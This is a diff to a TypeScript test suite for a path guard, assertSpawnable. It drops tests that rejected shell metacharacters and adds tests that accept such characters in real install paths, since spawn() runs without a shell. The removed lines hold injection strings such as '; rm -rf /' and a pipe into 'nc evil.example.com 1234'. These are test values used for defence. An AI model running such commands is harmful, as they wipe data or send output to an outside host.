@@ -40,25 +40,25 @@ describe('assertSpawnable', () => {
     })
   })
 
-  describe('rejects shell metacharacters', () => {
-    const reject: ReadonlyArray<string> = [
-      '/usr/local/bin/claude; rm -rf /',
-      '/usr/local/bin/claude && evil',
-      '/usr/local/bin/claude | nc evil.example.com 1234',
-      '/usr/local/bin/claude`evil`',
-      '/usr/local/bin/claude$EVIL',
-      '/usr/local/bin/claude<input',
-      '/usr/local/bin/claude>output',
-      '/usr/local/bin/claude\nrm',
-      '/usr/local/bin/claude\rrm',
+  describe('accepts legitimate path segments containing shell metacharacters (Codex P2 round-1)', () => {
+    // `SubprocessLifecycle.spawn()` calls `child_process.spawn()` without
+    // `shell: true`, so `&`, `$`, `;`, etc. in the path are passed to the
+    // kernel as opaque bytes. They are legitimate filename characters on
+    // both POSIX and Windows filesystems — rejecting them turned valid
+    // install paths into hard launch failures. The guard's job is to fail
+    // the *shape* (relative, shell-interpreter basename, non-claude basename),
+    // not the *content* of the directory segments.
+    const accept: ReadonlyArray<string> = [
+      '/Users/me/Apps & Tools/claude',
+      '/home/user/$WORK/claude',
+      '/opt/anthropic;legacy/claude',
+      '/srv/backticks`folder/claude',
+      'C:\\Program Files (x86)\\Anthropic\\claude.exe',
     ]
-    for (const p of reject) {
-      it(`rejects ${JSON.stringify(p)}`, () => {
+    for (const p of accept) {
+      it(`accepts ${JSON.stringify(p)}`, () => {
         const result = assertSpawnable(p)
-        expect(result.ok).toBe(false)
-        if (!result.ok) {
-          expect(result.error.message).toContain('shell metacharacter')
-        }
+        expect(result.ok).toBe(true)
       })
     }
   })
